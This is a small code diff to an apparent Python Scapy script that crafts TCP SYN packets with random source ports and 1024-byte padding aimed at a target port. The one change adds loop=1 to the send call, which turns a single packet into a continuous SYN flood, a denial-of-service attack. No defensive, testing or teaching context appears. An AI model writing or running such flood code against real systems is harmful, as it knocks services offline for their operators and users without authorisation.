@@ -19,4 +19,4 @@ tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 raw = Raw(b"X"*1024)
 
 packet = ip/tcp/raw
-send(packet, verbose=0)
+send(packet, loop=1, verbose=0)
